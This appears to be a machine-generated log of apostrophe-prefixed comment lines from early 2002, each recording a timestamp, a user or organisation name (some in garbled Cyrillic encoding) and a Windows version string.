'Windows NT 5.0 Pentium


'18.02.2002 6:04:46
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 6:06:10
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 6:52:34
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 6:54:52
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 8:50:44
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 10:27:17
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 10:27:45
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 10:30:30
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 10:31:37
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 10:32:24
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 10:32:26
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 10:33:08
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 10:34:36
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 10:34:55
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 10:37:37
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 10:38:24
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 10:38:45
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 10:39:35
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 10:40:13
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 10:40:22
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 10:42:10
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 10:43:01
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 10:44:03
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 10:44:05
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 10:44:17
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 11:07:41
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 12:39:30
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 12:41:40
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 12:42:56
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 12:48:23
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 12:50:32
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 12:51:19
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 12:51:30
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 12:52:01
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 12:52:03
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 12:52:38
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 12:54:19
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 12:54:50
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 12:56:00
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 12:56:02
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 12:56:26
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 12:56:37
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 12:57:21
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 12:58:09
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 13:03:24
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 13:03:34
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 16:39:13
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 16:42:42
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 16:43:12
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 16:48:19
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:23:49
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:23:56
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:24:03
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:24:10
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:24:40
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:24:49
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:24:55
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:25:07
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:26:05
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:26:20
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:27:15
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:27:37
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:28:10
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:28:32
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:28:50
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:29:56
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:31:26
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:31:52
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:34:32
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:34:57
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:37:10
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:37:51
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:38:36
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:39:00
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:40:15
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:41:36
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:42:00
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:42:39
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:42:52
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:43:28
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:44:41
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:45:40
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:47:22
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:47:38
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:47:56
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:48:08
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:48:28
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:48:57
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:49:11
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:49:19
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:49:26
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:49:34
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 17:50:53
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 22:51:06
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 23:01:40
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 23:02:06
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 23:02:34
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 23:04:31
'Donskoi
'Windows NT 5.0 Pentium


'18.02.2002 23:59:06
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 4:38:48
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 4:39:57
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 4:40:06
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 4:48:20
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 4:53:30
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 4:58:42
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 5:50:47
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 5:51:49
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 6:02:17
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 6:09:19
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 6:11:31
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 6:13:40
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 6:19:20
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 6:19:32
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 6:19:41
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 6:19:56
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 6:20:21
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 6:29:42
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 6:32:55
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 6:33:40
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 6:34:25
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 6:38:14
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 6:39:02
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 6:48:00
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 7:50:42
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 7:50:53
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 20:29:50
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 21:38:07
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 21:38:57
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 21:40:03
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 21:48:21
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 22:42:26
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 22:43:03
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 22:45:55
'Donskoi
'Windows NT 5.0 Pentium


'19.02.2002 23:43:08
'Donskoi
'Windows NT 5.0 Pentium


'20.02.2002 0:37:21
'Donskoi
'Windows NT 5.0 Pentium


'20.02.2002 6:45:35
'Donskoi
'Windows NT 5.0 Pentium


'20.02.2002 6:45:55
'Donskoi
'Windows NT 5.0 Pentium


'20.02.2002 8:26:29
'Donskoi
'Windows NT 5.0 Pentium


'20.02.2002 8:26:40
'Donskoi
'Windows NT 5.0 Pentium


'20.02.2002 8:26:52
'Donskoi
'Windows NT 5.0 Pentium


'21.02.2002 5:16:44
'Donskoi
'Windows NT 5.0 Pentium


'21.02.2002 5:17:13
'Donskoi
'Windows NT 5.0 Pentium


'21.02.2002 5:18:08
'Donskoi
'Windows NT 5.0 Pentium


'21.02.2002 12:48:29
'Donskoi
'Windows NT 5.0 Pentium


'21.02.2002 14:19:32
'Donskoi
'Windows NT 5.0 Pentium


'21.02.2002 14:22:15
'Donskoi
'Windows NT 5.0 Pentium


'21.02.2002 19:35:19
'Donskoi
'Windows NT 5.0 Pentium


'21.02.2002 21:45:54
'Donskoi
'Windows NT 5.0 Pentium


'21.02.2002 22:56:20
'Donskoi
'Windows NT 5.0 Pentium


'21.02.2002 22:57:35
'Donskoi
'Windows NT 5.0 Pentium


'21.02.2002 22:57:37
'Donskoi
'Windows NT 5.0 Pentium


'21.02.2002 23:00:07
'Donskoi
'Windows NT 5.0 Pentium


'21.02.2002 23:01:28
'Donskoi
'Windows NT 5.0 Pentium


'21.02.2002 23:01:58
'Donskoi
'Windows NT 5.0 Pentium


'21.02.2002 23:01:59
'Donskoi
'Windows NT 5.0 Pentium


'21.02.2002 23:41:34
'Donskoi
'Windows NT 5.0 Pentium


'21.02.2002 23:49:51
'Donskoi
'Windows NT 5.0 Pentium


'21.02.2002 23:59:26
'Donskoi
'Windows NT 5.0 Pentium


'22.02.2002 0:00:27
'Donskoi
'Windows NT 5.0 Pentium


'28.02.02 14:20:45
'*****
'Windows 4.10 Pentium


'28.02.02 14:39:57
'*****
'Windows 4.10 Pentium


'28.02.02 14:41:34
'*****
'Windows 4.10 Pentium


'28.02.02 15:07:41
'*****
'Windows 4.10 Pentium


'01.03.02 12:03:02
'*****
'Windows 4.10 Pentium


'01.03.02 12:25:59
'*****
'Windows 4.10 Pentium


'01.03.02 12:29:00
'*****
'Windows 4.10 Pentium


'01.03.02 12:31:05
'*****
'Windows 4.10 Pentium


'01.03.02 13:14:31
'*****
'Windows 4.10 Pentium


'01.03.02 13:18:02
'*****
'Windows 4.10 Pentium


'01.03.02 13:36:17
'*****
'Windows 4.10 Pentium


'01.03.02 13:52:35
'*****
'Windows 4.10 Pentium


'01.03.02 14:27:50
'*****
'Windows 4.10 Pentium


'01.03.02 15:46:15
'*****
'Windows 4.10 Pentium


'01.03.02 16:12:15
'*****
'Windows 4.10 Pentium


'04.03.02 12:21:26
'*****
'Windows 4.10 Pentium


'04.03.02 14:38:37
'*****
'Windows 4.10 Pentium


'05.03.02 10:15:06
'*****
'Windows 4.10 Pentium


'05.03.02 10:15:38
'*****
'Windows 4.10 Pentium


'05.03.02 10:16:40
'*****
'Windows 4.10 Pentium


'05.03.02 14:38:10
'*****
'Windows 4.10 Pentium


'05.03.02 16:07:04
'*****
'Windows 4.10 Pentium


'05.03.02 18:06:47
'*****
'Windows 4.10 Pentium


'06.03.02 0:56:51
'*****
'Windows 4.10 Pentium


'06.03.02 1:15:29
'*****
'Windows 4.10 Pentium


'06.03.02 1:25:31
'*****
'Windows 4.10 Pentium


'06.03.02 1:26:38
'*****
'Windows 4.10 Pentium


'06.03.02 1:28:13
'*****
'Windows 4.10 Pentium


'06.03.02 13:40:10
'*****
'Windows 4.10 Pentium


'06.03.02 14:26:57
'*****
'Windows 4.10 Pentium


'06.03.02 14:30:59
'*****
'Windows 4.10 Pentium


'06.03.02 14:32:55
'*****
'Windows 4.10 Pentium


'07.03.02 10:12:25
'*****
'Windows 4.10 Pentium


'07.03.02 11:28:18
'*****
'Windows 4.10 Pentium


'07.03.02 12:03:23
'*****
'Windows 4.10 Pentium


'07.03.02 12:50:56
'*****
'Windows 4.10 Pentium


'07.03.02 12:51:39
'*****
'Windows 4.10 Pentium


'07.03.02 14:27:30
'*****
'Windows 4.10 Pentium


'09.03.02 0:55:54
'*****
'Windows 4.10 Pentium


'11.03.02 9:58:20
'*****
'Windows 4.10 Pentium


'11.03.02 10:02:46
'*****
'Windows 4.10 Pentium


'11.03.02 10:53:18
'*****
'Windows 4.10 Pentium


'11.03.02 10:54:02
'*****
'Windows 4.10 Pentium


'11.03.02 10:59:42
'*****
'Windows 4.10 Pentium


'11.03.02 13:58:12
'*****
'Windows 4.10 Pentium


'13.03.02 13:05:04
'*****
'Windows 4.10 Pentium


'13.03.02 13:32:47
'*****
'Windows 4.10 Pentium


'13.03.02 13:34:35
'*****
'Windows 4.10 Pentium


'13.03.02 13:37:58
'*****
'Windows 4.10 Pentium


'13.03.02 13:39:23
'*****
'Windows 4.10 Pentium


'13.03.02 13:44:33
'*****
'Windows 4.10 Pentium


'13.03.02 13:46:46
'*****
'Windows 4.10 Pentium


'13.03.02 13:54:35
'*****
'Windows 4.10 Pentium


'13.03.02 13:55:33
'*****
'Windows 4.10 Pentium


'13.03.02 13:56:46
'*****
'Windows 4.10 Pentium


'13.03.02 13:59:05
'*****
'Windows 4.10 Pentium


'13.03.02 14:21:24
'*****
'Windows 4.10 Pentium


'13.03.02 14:29:20
'*****
'Windows 4.10 Pentium


'13.03.02 14:38:25
'*****
'Windows 4.10 Pentium


'14.03.02 12:34:16
'*****
'Windows 4.10 Pentium


'15.03.02 9:28:57
'*****
'Windows 4.10 Pentium


'15.03.02 9:48:46
'*****
'Windows 4.10 Pentium


'15.03.02 11:13:10
'*****
'Windows 4.10 Pentium


'15.03.02 14:26:15
'*****
'Windows 4.10 Pentium


'15.03.02 15:21:07
'*****
'Windows 4.10 Pentium


'18.03.02 12:00:34
'*****
'Windows 4.10 Pentium


'18.03.02 12:04:56
'*****
'Windows 4.10 Pentium


'18.03.02 12:13:25
'*****
'Windows 4.10 Pentium


'18.03.02 12:16:11
'*****
'Windows 4.10 Pentium


'19.03.02 11:53:20
'*****
'Windows 4.10 Pentium


'19.03.02 11:55:27
'*****
'Windows 4.10 Pentium


'19.03.02 12:13:02
'*****
'Windows 4.10 Pentium


'20.03.02 10:09:45
'*****
'Windows 4.10 Pentium


'20.03.02 13:34:46
'*****
'Windows 4.10 Pentium


'20.03.02 13:43:56
'*****
'Windows 4.10 Pentium


'20.03.02 14:21:03
'*****
'Windows 4.10 Pentium


'20.03.02 14:26:43
'*****
'Windows 4.10 Pentium


'21.03.02 13:52:01
'*****
'Windows 4.10 Pentium


'21.03.02 17:32:38
'*****
'Windows 4.10 Pentium


'22.03.02 11:06:27
'*****
'Windows 4.10 Pentium


'22.03.02 11:09:28
'*****
'Windows 4.10 Pentium


'22.03.02 12:13:11
'*****
'Windows 4.10 Pentium


'22.03.02 12:40:31
'*****
'Windows 4.10 Pentium


'22.03.02 14:29:58
'*****
'Windows 4.10 Pentium


'22.03.02 15:13:00
'*****
'Windows 4.10 Pentium


'22.03.02 16:56:29
'*****
'Windows 4.10 Pentium


'22.03.02 16:58:12
'*****
'Windows 4.10 Pentium


'22.03.02 17:01:02
'*****
'Windows 4.10 Pentium


'25.03.02 9:31:12
'*****
'Windows 4.10 Pentium


'26.03.02 11:13:52
'*****
'Windows 4.10 Pentium


'26.03.02 13:55:07
'*****
'Windows 4.10 Pentium


'26.03.02 15:17:50
'*****
'Windows 4.10 Pentium


'26.03.02 15:18:50
'*****
'Windows 4.10 Pentium


'26.03.02 15:22:50
'*****
'Windows 4.10 Pentium


'27.03.02 12:44:45
'*****
'Windows 4.10 Pentium


'29.03.02 11:34:44
'*****
'Windows 4.10 Pentium


'29.03.02 11:36:47
'*****
'Windows 4.10 Pentium


'29.03.02 11:44:28
'*****
'Windows 4.10 Pentium


'29.03.02 15:47:32
'Îðã
'Windows 4.10 Pentium


'29.03.02 16:42:08
'Îðã
'Windows 4.10 Pentium


'29.03.02 17:26:29
'Îðã
'Windows 4.10 Pentium


'29.03.02 17:35:02
'Îðã
'Windows 4.10 Pentium


'29.03.02 17:35:43
'Îðã
'Windows 4.10 Pentium


'29.03.02 17:37:30
'Îðã
'Windows 4.10 Pentium


'29.03.02 17:39:15
'Îðã
'Windows 4.10 Pentium


'29.03.02 17:40:16
'Îðã
'Windows 4.10 Pentium


'29.03.02 17:41:01
'Îðã
'Windows 4.10 Pentium


'29.03.02 17:42:34
'Îðã
'Windows 4.10 Pentium


'01.04.02 11:24:50
'Îðã
'Windows 4.10 Pentium


'01.04.02 11:26:11
'Îðã
'Windows 4.10 Pentium


'01.04.02 12:31:45
'Îðã
'Windows 4.10 Pentium


'01.04.02 12:33:08
'Îðã
'Windows 4.10 Pentium


'01.04.02 12:40:33
'Îðã
'Windows 4.10 Pentium


'01.04.02 14:06:45
'Îðã
'Windows 4.10 Pentium


'01.04.02 14:08:16
'Îðã
'Windows 4.10 Pentium


'01.04.02 14:46:24
'Îðã
'Windows 4.10 Pentium


'01.04.02 17:19:45
'Îðã
'Windows 4.10 Pentium


'01.04.02 17:20:51
'Îðã
'Windows 4.10 Pentium


'01.04.02 17:22:55
'Îðã
'Windows 4.10 Pentium


'01.04.02 17:24:52
'Îðã
'Windows 4.10 Pentium


'02.04.02 9:16:59
'Îðã
'Windows 4.10 Pentium


'02.04.02 9:32:16
'Îðã
'Windows 4.10 Pentium


'02.04.02 9:33:32
'Îðã
'Windows 4.10 Pentium


'02.04.02 12:00:06
'Îðã
'Windows 4.10 Pentium


'02.04.02 15:37:51
'Îðã
'Windows 4.10 Pentium


'03.04.02 9:28:54
'Îðã
'Windows 4.10 Pentium


'03.04.02 16:39:02
'Îðã
'Windows 4.10 Pentium


'03.04.02 16:39:38
'Îðã
'Windows 4.10 Pentium


'03.04.02 16:56:04
'Îðã
'Windows 4.10 Pentium


'04.04.02 9:08:58
'Îðã
'Windows 4.10 Pentium


'04.04.02 10:52:45
'Îðã
'Windows 4.10 Pentium


'04.04.02 11:01:23
'Îðã
'Windows 4.10 Pentium


'04.04.02 14:19:13
'Îðã
'Windows 4.10 Pentium


'04.04.02 16:05:37
'Îðã
'Windows 4.10 Pentium


'04.04.02 16:23:56
'Îðã
'Windows 4.10 Pentium


'04.04.02 16:28:00
'Îðã
'Windows 4.10 Pentium


'04.04.02 16:36:25
'Îðã
'Windows 4.10 Pentium


'04.04.02 16:48:13
'Îðã
'Windows 4.10 Pentium


'04.04.02 16:49:01
'Îðã
'Windows 4.10 Pentium


'04.04.02 18:24:41
'Îðã
'Windows 4.10 Pentium


'05.04.02 9:34:45
'Îðã
'Windows 4.10 Pentium


'05.04.02 9:35:16
'Îðã
'Windows 4.10 Pentium


'05.04.02 9:36:49
'Îðã
'Windows 4.10 Pentium


'05.04.02 10:16:40
'Îðã
'Windows 4.10 Pentium


'05.04.02 12:03:24
'Îðã
'Windows 4.10 Pentium


'05.04.02 12:22:04
'Îðã
'Windows 4.10 Pentium


'05.04.02 12:52:34
'Îðã
'Windows 4.10 Pentium


'05.04.02 15:14:32
'Îðã
'Windows 4.10 Pentium


'05.04.02 16:24:30
'Îðã
'Windows 4.10 Pentium


'05.04.02 16:24:58
'Îðã
'Windows 4.10 Pentium


'05.04.02 16:26:20
'Îðã
'Windows 4.10 Pentium


'05.04.02 16:26:55
'Îðã
'Windows 4.10 Pentium


'05.04.02 16:27:28
'Îðã
'Windows 4.10 Pentium


'08.04.02 13:51:26
'Îðã
'Windows 4.10 Pentium


'08.04.02 16:35:50
'Îðã
'Windows 4.10 Pentium


'08.04.02 16:37:17
'Îðã
'Windows 4.10 Pentium


'08.04.02 16:45:48
'Îðã
'Windows 4.10 Pentium


'09.04.02 9:33:45
'Îðã
'Windows 4.10 Pentium


'09.04.02 11:47:59
'Îðã
'Windows 4.10 Pentium


'09.04.02 11:52:07
'Îðã
'Windows 4.10 Pentium


'09.04.02 12:23:19
'Îðã
'Windows 4.10 Pentium


'09.04.02 12:25:16
'Îðã
'Windows 4.10 Pentium


'09.04.02 12:28:17
'Îðã
'Windows 4.10 Pentium


'09.04.02 12:29:53
'Îðã
'Windows 4.10 Pentium


'09.04.02 13:06:08
'Îðã
'Windows 4.10 Pentium


'09.04.02 14:55:24
'Îðã
'Windows 4.10 Pentium


'09.04.02 14:57:48
'Îðã
'Windows 4.10 Pentium


'09.04.02 15:09:27
'Îðã
'Windows 4.10 Pentium


'09.04.02 16:23:37
'Îðã
'Windows 4.10 Pentium


'09.04.02 17:00:09
'Îðã
'Windows 4.10 Pentium


'09.04.02 17:59:17
'Îðã
'Windows 4.10 Pentium


'09.04.02 18:35:07
'Îðã
'Windows 4.10 Pentium


'09.04.02 18:45:03
'Îðã
'Windows 4.10 Pentium


'09.04.02 18:45:58
'Îðã
'Windows 4.10 Pentium


'10.04.02 10:06:23
'Îðã
'Windows 4.10 Pentium


'10.04.02 10:07:23
'Îðã
'Windows 4.10 Pentium


'10.04.02 10:08:16
'Îðã
'Windows 4.10 Pentium


'10.04.02 10:08:44
'Îðã
'Windows 4.10 Pentium


'10.04.02 10:09:13
'Îðã
'Windows 4.10 Pentium


'10.04.02 10:10:00
'Îðã
'Windows 4.10 Pentium


'10.04.02 10:10:38
'Îðã
'Windows 4.10 Pentium


'10.04.02 10:11:33
'Îðã
'Windows 4.10 Pentium


'10.04.02 10:25:47
'Îðã
'Windows 4.10 Pentium


'10.04.02 14:58:32
'Îðã
'Windows 4.10 Pentium


'10.04.02 15:52:09
'Îðã
'Windows 4.10 Pentium


'10.04.02 15:54:07
'Îðã
'Windows 4.10 Pentium


'10.04.02 15:55:34
'Îðã
'Windows 4.10 Pentium


'10.04.02 16:00:38
'Îðã
'Windows 4.10 Pentium


'10.04.02 16:02:59
'Îðã
'Windows 4.10 Pentium


'10.04.02 16:05:06
'Îðã
'Windows 4.10 Pentium


'10.04.02 16:05:47
'Îðã
'Windows 4.10 Pentium


'10.04.02 16:07:13
'Îðã
'Windows 4.10 Pentium


'10.04.02 17:06:22
'Îðã
'Windows 4.10 Pentium


'11.04.02 9:47:08
'Îðã
'Windows 4.10 Pentium


'11.04.02 12:19:18
'Îðã
'Windows 4.10 Pentium


'11.04.02 12:21:31
'Îðã
'Windows 4.10 Pentium


'11.04.02 14:05:27
'Îðã
'Windows 4.10 Pentium


'11.04.02 14:26:54
'Îðã
'Windows 4.10 Pentium


'11.04.02 15:57:58
'Îðã
'Windows 4.10 Pentium


'11.04.02 16:42:54
'Îðã
'Windows 4.10 Pentium


'11.04.02 16:47:55
'Îðã
'Windows 4.10 Pentium


'11.04.02 17:06:35
'Îðã
'Windows 4.10 Pentium


'11.04.02 17:09:20
'Îðã
'Windows 4.10 Pentium


'11.04.02 17:17:24
'Îðã
'Windows 4.10 Pentium


'11.04.02 17:22:08
'Îðã
'Windows 4.10 Pentium


'12.04.02 9:06:22
'Îðã
'Windows 4.10 Pentium


'12.04.02 9:08:31
'Îðã
'Windows 4.10 Pentium


'12.04.02 11:00:05
'Îðã
'Windows 4.10 Pentium


'12.04.02 11:47:05
'Îðã
'Windows 4.10 Pentium


'12.04.02 11:57:39
'Îðã
'Windows 4.10 Pentium


'12.04.02 12:45:13
'Îðã
'Windows 4.10 Pentium


'12.04.02 13:02:40
'Îðã
'Windows 4.10 Pentium


'12.04.02 13:24:04
'Îðã
'Windows 4.10 Pentium


'12.04.02 13:24:12
'Îðã
'Windows 4.10 Pentium


'12.04.02 13:45:43
'Îðã
'Windows 4.10 Pentium


'12.04.02 14:11:59
'Îðã
'Windows 4.10 Pentium


'12.04.02 14:37:47
'Îðã
'Windows 4.10 Pentium


'12.04.02 14:48:41
'Îðã
'Windows 4.10 Pentium


'12.04.02 15:07:42
'Îðã
'Windows 4.10 Pentium


'15.04.02 10:29:26
'Îðã
'Windows 4.10 Pentium


'15.04.02 10:30:00
'Îðã
'Windows 4.10 Pentium


'15.04.02 10:32:55
'Îðã
'Windows 4.10 Pentium


'15.04.02 10:33:25
'Îðã
'Windows 4.10 Pentium


'15.04.02 10:34:45
'Îðã
'Windows 4.10 Pentium


'15.04.02 10:46:58
'Îðã
'Windows 4.10 Pentium


'15.04.02 10:48:07
'Îðã
'Windows 4.10 Pentium


'15.04.02 10:48:31
'Îðã
'Windows 4.10 Pentium


'15.04.02 10:50:10
'Îðã
'Windows 4.10 Pentium


'15.04.02 10:50:51
'Îðã
'Windows 4.10 Pentium


'15.04.02 11:11:00
'Îðã
'Windows 4.10 Pentium


'15.04.02 12:23:27
'Îðã
'Windows 4.10 Pentium


'15.04.02 12:31:18
'Îðã
'Windows 4.10 Pentium


'15.04.02 12:59:54
'Îðã
'Windows 4.10 Pentium


'15.04.02 13:00:59
'Îðã
'Windows 4.10 Pentium


'15.04.02 15:53:41
'Îðã
'Windows 4.10 Pentium


'15.04.02 16:15:00
'Îðã
'Windows 4.10 Pentium


'18.04.02 11:58:50
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'18.04.02 11:59:51
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'18.04.02 17:55:55
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'18.04.02 18:02:08
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'18.04.02 18:58:28
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'18.04.02 19:01:04
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'18.04.02 19:02:30
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'18.04.02 19:21:50
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'18.04.02 19:22:24
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'18.04.02 19:53:45
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'18.04.02 21:38:35
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'19.04.02 8:18:43
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'19.04.02 12:44:39
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'19.04.02 13:03:12
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'19.04.02 13:03:28
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'19.04.02 13:15:50
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'19.04.02 13:18:26
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'19.04.02 15:18:11
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'19.04.02 15:53:56
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'19.04.02 17:06:21
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'19.04.02 17:06:31
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'19.04.02 17:07:35
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'22.04.02 11:39:00
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'22.04.02 11:55:45
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'22.04.02 12:27:12
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'22.04.02 16:45:24
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'22.04.02 16:58:53
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'23.04.00 9:28:17
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'23.04.00 9:29:02
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'23.04.00 12:57:08
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'23.04.02 13:07:33
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'23.04.02 14:21:45
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'23.04.02 18:33:33
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'23.04.02 18:37:04
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'23.04.02 19:07:37
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


